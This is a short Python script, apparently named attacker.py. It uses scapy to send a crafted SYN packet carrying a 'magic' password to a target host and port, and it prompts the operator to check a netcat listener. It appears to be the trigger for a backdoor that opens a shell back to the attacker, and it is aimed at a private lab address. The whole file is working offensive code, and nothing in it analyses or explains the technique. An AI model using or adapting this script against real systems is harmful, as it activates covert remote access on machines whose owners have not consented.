# attacker.py
from scapy.all import *
import sys

TARGET_IP = "192.168.111.128" 
TARGET_PORT = 12345        
MAGIC_KEY = b"MAGICPASS"    

def send_magic_packet():
    print(f"[*] Sending Magic Packet to {TARGET_IP}...")
    
    pkt = IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S") / Raw(load=MAGIC_KEY)
    
    send(pkt, verbose=0)
    print("[+] Packet Sent! Check your Netcat listener.")

if __name__ == "__main__":
    send_magic_packet()